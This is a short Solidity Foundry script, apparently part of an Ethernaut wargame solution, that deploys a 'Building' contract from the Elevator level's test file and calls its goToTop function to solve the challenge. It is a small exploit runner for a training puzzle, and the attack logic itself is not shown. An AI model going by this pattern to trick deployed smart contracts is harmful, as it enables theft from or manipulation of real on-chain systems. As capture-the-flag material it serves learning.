// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Building} from "../../test/Ethernaut/Elevator.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Building building = new Building();
        building.goToTop();
        vm.stopBroadcast();
    }
}
